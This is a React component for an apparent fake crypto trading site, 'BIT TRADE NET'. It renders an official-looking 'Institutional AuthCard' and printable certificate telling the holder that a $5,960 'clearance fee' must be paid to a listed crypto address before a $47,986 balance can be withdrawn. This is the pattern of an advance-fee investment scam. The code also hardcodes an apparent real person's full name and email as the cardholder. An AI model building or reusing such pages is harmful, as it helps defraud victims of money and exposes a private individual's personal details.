import React, { useState } from 'react';
import { useTrading } from '../../context/TradingContext';
import { 
  ShieldCheck, 
  RotateCcw, 
  Printer, 
  Download, 
  Copy, 
  Check, 
  ExternalLink, 
  QrCode, 
  Sparkles, 
  Lock, 
  Key, 
  BadgeCheck, 
  CheckCircle2, 
  AlertCircle,
  FileText,
  CreditCard,
  ArrowRight
} from 'lucide-react';

interface InstitutionalAuthCardProps {
  compact?: boolean;
  onNavigateToReview?: () => void;
  showActions?: boolean;
}

export const InstitutionalAuthCard: React.FC<InstitutionalAuthCardProps> = ({
  compact = false,
  onNavigateToReview,
  showActions = true,
}) => {
  const { user, cashBalanceUSD, setCurrentPage, addToast } = useTrading();
  const [isFlipped, setIsFlipped] = useState(false);
  const [copiedToken, setCopiedToken] = useState(false);
  const [showCertDetails, setShowCertDetails] = useState(false);

  const cardHolder = user?.name || 'Joshua James Bergin';
  const cardEmail = user?.email || 'Berginjoshua1@gmail.com';
  const cardId = 'BTN-AUTH-8849-2026';
  const authHash = '0x71C84092bF589A389Afb60f1A953b018599Ac02e';
  const complianceNode = '0x003bB95cE0010Fa8e9F7d81884f506355387cA1A';
  const balance = cashBalanceUSD || 47986.0;
  const clearanceFee = 5960.0;

  const handleCopyCredentials = () => {
    const credText = `BIT TRADE NET INSTITUTIONAL AUTH CARD
Cardholder: ${cardHolder}
Email: ${cardEmail}
Authorization ID: ${cardId}
Status: Tier 2 Verified (Institutional Clearance)
Available Balance: $${balance.toLocaleString('en-US', { minimumFractionDigits: 2 })}
Required Clearance Settlement: $${clearanceFee.toLocaleString('en-US', { minimumFractionDigits: 2 })}
Settlement Address: ${authHash}
Compliance Node: ${complianceNode}`;

    navigator.clipboard.writeText(credText);
    setCopiedToken(true);
    addToast({
      type: 'success',
      title: 'AuthCard Data Copied',
      message: 'Institutional verification credentials copied to clipboard.',
      duration: 3000,
    });
    setTimeout(() => setCopiedToken(false), 2000);
  };

  const handlePrintCard = () => {
    window.print();
  };

  const handleGoToReview = () => {
    if (onNavigateToReview) {
      onNavigateToReview();
    } else {
      setCurrentPage('withdrawal-review');
    }
  };

  return (
    <div className="w-full flex flex-col items-center">
      {/* 3D Flip Card Container */}
      <div 
        className="w-full max-w-[500px] perspective-[1200px]"
        style={{ minHeight: compact ? '260px' : '300px' }}
      >
        <div
          onClick={() => setIsFlipped(!isFlipped)}
          className={`relative w-full rounded-2xl cursor-pointer select-none transition-transform duration-700 [transform-style:preserve-3d] shadow-2xl ${
            isFlipped ? '[transform:rotateY(180deg)]' : ''
          }`}
          style={{
            minHeight: compact ? '260px' : '300px',
            boxShadow: '0 25px 60px -15px rgba(0, 0, 0, 0.9), 0 0 35px rgba(16, 185, 129, 0.25)',
          }}
          title="Click to flip card"
        >
          {/* ======================================================== */}
          {/* FRONT OF THE AUTH CARD                                   */}
          {/* ======================================================== */}
          <div 
            className="absolute inset-0 rounded-2xl p-5 sm:p-6 [backface-visibility:hidden] overflow-hidden flex flex-col justify-between border border-emerald-500/40 bg-gradient-to-br from-[#0b1728] via-[#09111e] to-[#040810]"
          >
            {/* Holographic dynamic rainbow / metallic sheen effect */}
            <div 
              className="absolute inset-0 opacity-20 pointer-events-none mix-blend-overlay bg-gradient-to-tr from-emerald-400 via-cyan-400 to-amber-300"
            />
            {/* Background grid watermark */}
            <div className="absolute inset-0 bg-trading-grid opacity-20 pointer-events-none" />

            {/* Subtle institutional seal watermark */}
            <div className="absolute -right-10 -bottom-10 w-56 h-56 rounded-full border-8 border-emerald-500/10 pointer-events-none flex items-center justify-center">
              <span className="text-6xl font-black text-emerald-500/5 select-none font-mono">BTN</span>
            </div>

            {/* Top Row: Brand & Chip */}
            <div className="relative z-10 flex items-start justify-between">
              <div className="flex items-center gap-2.5">
                <div className="w-8 h-8 rounded-xl bg-gradient-to-br from-emerald-400 to-teal-600 flex items-center justify-center font-black text-slate-950 text-base shadow-md shadow-emerald-500/30">
                  B
                </div>
                <div>
                  <div className="font-extrabold text-sm tracking-wider text-white">
                    BIT<span className="text-emerald-400">TRADE</span>.NET
                  </div>
                  <div className="text-[9px] uppercase tracking-widest text-emerald-300/80 font-bold">
                    Institutional AuthCard &bull; Tier 2
                  </div>
                </div>
              </div>

              {/* Verified Holographic Status Tag */}
              <div className="flex items-center gap-1.5 px-2.5 py-1 rounded-full bg-emerald-500/15 border border-emerald-500/40 text-[10px] font-bold text-emerald-400 backdrop-blur-md">
                <BadgeCheck className="w-3.5 h-3.5 text-emerald-400" />
                <span>AUTHORIZED</span>
              </div>
            </div>

            {/* Middle Row: Gold Chip & Contactless NFC */}
            <div className="relative z-10 my-auto py-2 flex items-center justify-between">
              <div className="flex items-center gap-3">
                {/* Metallic Gold EMV Chip */}
                <div className="w-11 h-8 rounded-md bg-gradient-to-br from-amber-200 via-amber-400 to-amber-600 border border-amber-300 shadow-md relative overflow-hidden flex flex-col justify-around p-1">
                  <div className="w-full h-[1px] bg-amber-700/50" />
                  <div className="w-full h-[1px] bg-amber-700/50" />
                  <div className="w-full h-[1px] bg-amber-700/50" />
                  <div className="absolute top-0 bottom-0 left-1/3 w-[1px] bg-amber-700/50" />
                  <div className="absolute top-0 bottom-0 right-1/3 w-[1px] bg-amber-700/50" />
                </div>
                {/* Contactless symbol */}
                <div className="text-slate-400/80">
                  <svg className="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <path d="M8.5 16.5a5 5 0 0 1 0-9" strokeLinecap="round" />
                    <path d="M12 19a8.5 8.5 0 0 1 0-14" strokeLinecap="round" />
                    <path d="M15.5 21.5a12 12 0 0 1 0-19" strokeLinecap="round" />
                  </svg>
                </div>
              </div>

              {/* Clearance Amount Box */}
              <div className="text-right">
                <div className="text-[9px] uppercase tracking-wider text-slate-400 font-medium">
                  Available Portfolio
                </div>
                <div className="text-base sm:text-lg font-black font-mono text-emerald-400 tracking-tight">
                  ${balance.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                </div>
              </div>
            </div>

            {/* Bottom Row: Cardholder & Member Serial */}
            <div className="relative z-10 pt-2 border-t border-slate-700/50">
              <div className="flex items-center justify-between text-[11px] font-mono tracking-widest text-slate-300 mb-1">
                <span>4532</span>
                <span>8849</span>
                <span>2026</span>
                <span>7190</span>
              </div>

              <div className="flex items-end justify-between mt-1">
                <div>
                  <div className="text-[8px] uppercase tracking-wider text-slate-400 font-bold">
                    Authorized Account Holder
                  </div>
                  <div className="text-xs sm:text-sm font-extrabold text-slate-100 tracking-wide font-sans">
                    {cardHolder.toUpperCase()}
                  </div>
                  <div className="text-[9px] text-emerald-300/80 font-mono">
                    {cardEmail}
                  </div>
                </div>

                <div className="text-right">
                  <div className="text-[8px] uppercase tracking-wider text-slate-400 font-bold">
                    Valid Thru
                  </div>
                  <div className="text-xs font-mono font-bold text-slate-200">
                    10/29
                  </div>
                  <div className="text-[9px] text-amber-400 font-mono font-semibold">
                    Fee: ${clearanceFee.toLocaleString('en-US', { minimumFractionDigits: 0 })}
                  </div>
                </div>
              </div>
            </div>

            {/* Click to flip tip */}
            <div className="absolute bottom-1 right-2 text-[9px] text-slate-500 font-mono opacity-60 flex items-center gap-1">
              <RotateCcw className="w-2.5 h-2.5" />
              <span>Flip</span>
            </div>
          </div>

          {/* ======================================================== */}
          {/* BACK OF THE AUTH CARD                                    */}
          {/* ======================================================== */}
          <div 
            className="absolute inset-0 rounded-2xl p-4 sm:p-5 [transform:rotateY(180deg)] [backface-visibility:hidden] overflow-hidden flex flex-col justify-between border border-emerald-500/40 bg-gradient-to-br from-[#050b14] via-[#09111e] to-[#040810]"
          >
            {/* Magnetic Stripe */}
            <div className="w-[calc(100%+2.5rem)] -mx-5 -mt-1 h-9 bg-slate-950 border-y border-slate-800 shadow-inner flex items-center px-4">
              <div className="w-full h-2 bg-gradient-to-r from-slate-800 via-slate-700 to-slate-900 rounded opacity-60" />
            </div>

            {/* Middle Section: Signature & Security Code */}
            <div className="relative z-10 my-2 space-y-2">
              <div className="flex items-center gap-3">
                <div className="flex-1 h-7 bg-slate-200 rounded px-2.5 flex items-center justify-between border border-slate-400">
                  <span className="font-serif italic text-xs text-slate-800 font-bold select-none tracking-wider">
                    {cardHolder}
                  </span>
                  <span className="font-mono text-[10px] text-slate-500 font-bold">
                    AUTHORIZED SIGNATURE
                  </span>
                </div>
                <div className="w-12 h-7 bg-slate-800 rounded border border-slate-600 flex items-center justify-center font-mono font-bold text-xs text-amber-400 shadow-inner">
                  849
                </div>
              </div>

              {/* Settlement Protocol Hash */}
              <div className="bg-slate-900/80 rounded-lg p-2 border border-slate-800 font-mono text-[9px] space-y-1">
                <div className="flex items-center justify-between text-slate-400">
                  <span>AUTH ID:</span>
                  <span className="text-emerald-400 font-bold">{cardId}</span>
                </div>
                <div className="flex items-center justify-between text-slate-400 truncate">
                  <span>SETTLEMENT NODE:</span>
                  <span className="text-slate-300 font-mono">{complianceNode.slice(0, 14)}...{complianceNode.slice(-6)}</span>
                </div>
                <div className="flex items-center justify-between text-slate-400 truncate">
                  <span>BENEFICIARY ADDR:</span>
                  <span className="text-slate-300 font-mono">{authHash.slice(0, 14)}...{authHash.slice(-6)}</span>
                </div>
              </div>
            </div>

            {/* Bottom: QR Code & Verification Note */}
            <div className="relative z-10 flex items-center justify-between pt-1 border-t border-slate-800">
              <div className="space-y-0.5 text-[8px] text-slate-400 max-w-[280px] leading-tight">
                <p className="text-slate-300 font-semibold">Institutional Trading Security Clearance</p>
                <p>
                  Institutional policy requires compliance fee of <strong>$5,960.00</strong> prior to balance release of <strong>${balance.toLocaleString('en-US', { minimumFractionDigits: 2 })}</strong>.
                </p>
                <p className="text-emerald-400 font-mono">
                  Scan QR for immediate Top First Review clearance.
                </p>
              </div>

              {/* Simulated QR Code for Immediate Review */}
              <div 
                onClick={(e) => {
                  e.stopPropagation();
                  handleGoToReview();
                }}
                className="w-14 h-14 bg-white p-1 rounded-lg border-2 border-emerald-400 flex flex-col items-center justify-center cursor-pointer hover:scale-105 transition-transform shadow-lg"
                title="Click to visit Withdrawal Review"
              >
                <QrCode className="w-10 h-10 text-slate-950" />
                <span className="text-[7px] font-black text-slate-950 leading-none">REVIEW</span>
              </div>
            </div>

            {/* Click to flip tip */}
            <div className="absolute bottom-1 right-2 text-[9px] text-slate-500 font-mono opacity-60 flex items-center gap-1">
              <RotateCcw className="w-2.5 h-2.5" />
              <span>Flip</span>
            </div>
          </div>
        </div>
      </div>

      {/* Action Controls & Document Helper */}
      {showActions && (
        <div className="w-full max-w-[500px] mt-4 space-y-2">
          {/* Quick Buttons Grid */}
          <div className="grid grid-cols-2 sm:grid-cols-3 gap-2">
            <button
              type="button"
              onClick={() => setIsFlipped(!isFlipped)}
              className="flex items-center justify-center gap-1.5 py-2 px-3 rounded-xl bg-slate-800/90 hover:bg-slate-700/90 border border-slate-700 text-xs font-semibold text-slate-200 transition-all cursor-pointer active:scale-95"
            >
              <RotateCcw className="w-3.5 h-3.5 text-emerald-400" />
              <span>{isFlipped ? 'Show Front' : 'Flip to Back'}</span>
            </button>

            <button
              type="button"
              onClick={handleCopyCredentials}
              className="flex items-center justify-center gap-1.5 py-2 px-3 rounded-xl bg-slate-800/90 hover:bg-slate-700/90 border border-slate-700 text-xs font-semibold text-slate-200 transition-all cursor-pointer active:scale-95"
            >
              {copiedToken ? (
                <>
                  <Check className="w-3.5 h-3.5 text-emerald-400" />
                  <span className="text-emerald-400">Copied</span>
                </>
              ) : (
                <>
                  <Copy className="w-3.5 h-3.5 text-slate-400" />
                  <span>Copy Auth Data</span>
                </>
              )}
            </button>

            <button
              type="button"
              onClick={handlePrintCard}
              className="col-span-2 sm:col-span-1 flex items-center justify-center gap-1.5 py-2 px-3 rounded-xl bg-slate-800/90 hover:bg-slate-700/90 border border-slate-700 text-xs font-semibold text-slate-200 transition-all cursor-pointer active:scale-95"
              title="Print or export AuthCard as PDF"
            >
              <Printer className="w-3.5 h-3.5 text-cyan-400" />
              <span>Print AuthCard</span>
            </button>
          </div>

          {/* Direct link to Top First Review Immediately */}
          <button
            type="button"
            id="btn-authcard-to-review"
            onClick={handleGoToReview}
            className="w-full flex items-center justify-between p-3 rounded-xl bg-gradient-to-r from-amber-500/15 via-emerald-500/15 to-transparent hover:from-amber-500/25 hover:via-emerald-500/25 border border-amber-500/40 text-xs font-bold text-amber-300 transition-all cursor-pointer group"
          >
            <div className="flex items-center gap-2">
              <span className="w-2 h-2 rounded-full bg-amber-400 animate-ping" />
              <span>Top First Review Immediately &bull; Withdrawal Clearance</span>
            </div>
            <div className="flex items-center gap-1 text-emerald-400 group-hover:translate-x-1 transition-transform">
              <span>View Review</span>
              <ArrowRight className="w-3.5 h-3.5" />
            </div>
          </button>
        </div>
      )}

      {/* Printable Certificate Template (Visible during Print or in modal) */}
      <div className="hidden print:block fixed inset-0 bg-white text-slate-950 p-8 z-[9999] font-sans">
        <div className="border-4 border-slate-900 p-6 rounded-lg max-w-2xl mx-auto space-y-6">
          <div className="flex justify-between items-center border-b-2 border-slate-900 pb-4">
            <div>
              <h1 className="text-2xl font-black tracking-tight">BIT TRADE NET</h1>
              <p className="text-xs uppercase font-bold text-slate-600">Institutional Financial Services &bull; Authorization Certificate</p>
            </div>
            <div className="text-right text-xs font-mono">
              <p className="font-bold">CERT REF: {cardId}</p>
              <p>ISSUED: OCTOBER 2026</p>
            </div>
          </div>

          <div className="space-y-4">
            <h2 className="text-lg font-black text-slate-900">INSTITUTIONAL TRADING AUTHORIZATION & CLEARANCE CARD</h2>
            
            <div className="grid grid-cols-2 gap-4 text-xs">
              <div>
                <p className="font-bold text-slate-500">AUTHORIZED ACCOUNT HOLDER:</p>
                <p className="text-base font-extrabold">{cardHolder}</p>
                <p className="font-mono">{cardEmail}</p>
              </div>
              <div>
                <p className="font-bold text-slate-500">CLEARANCE STATUS:</p>
                <p className="text-base font-extrabold text-amber-700">PENDING CLEARANCE SETTLEMENT</p>
                <p className="font-mono">KYC Tier 2 Verified</p>
              </div>
            </div>

            <div className="bg-slate-100 p-4 rounded border border-slate-300 space-y-2 text-xs">
              <div className="flex justify-between">
                <span className="font-bold">Available Account Balance:</span>
                <span className="font-mono font-bold">${balance.toLocaleString('en-US', { minimumFractionDigits: 2 })} USD</span>
              </div>
              <div className="flex justify-between">
                <span className="font-bold">Required Compliance Settlement Fee:</span>
                <span className="font-mono font-bold text-amber-800">${clearanceFee.toLocaleString('en-US', { minimumFractionDigits: 2 })} USD</span>
              </div>
              <div className="flex justify-between">
                <span className="font-bold">Clearance Settlement Rule:</span>
                <span>$5,960.00 has to be paid before available balance can be withdrawn, to meet with the investment.</span>
              </div>
            </div>

            <div className="text-xs font-mono space-y-1">
              <p><strong>Settlement Address:</strong> {authHash}</p>
              <p><strong>Compliance Node:</strong> {complianceNode}</p>
              <p><strong>Review Route:</strong> /#/withdrawal-review</p>
            </div>
          </div>

          <div className="border-t-2 border-slate-900 pt-4 flex justify-between items-center text-xs">
            <div>
              <p className="font-bold">Joshua J. Bergin</p>
              <p className="text-[10px] text-slate-600">Authorized Signature</p>
            </div>
            <div className="text-right">
              <p className="font-bold">BIT TRADE NET CLEARING HOUSE</p>
              <p className="text-[10px] text-slate-600">Institutional Risk Management Bureau</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
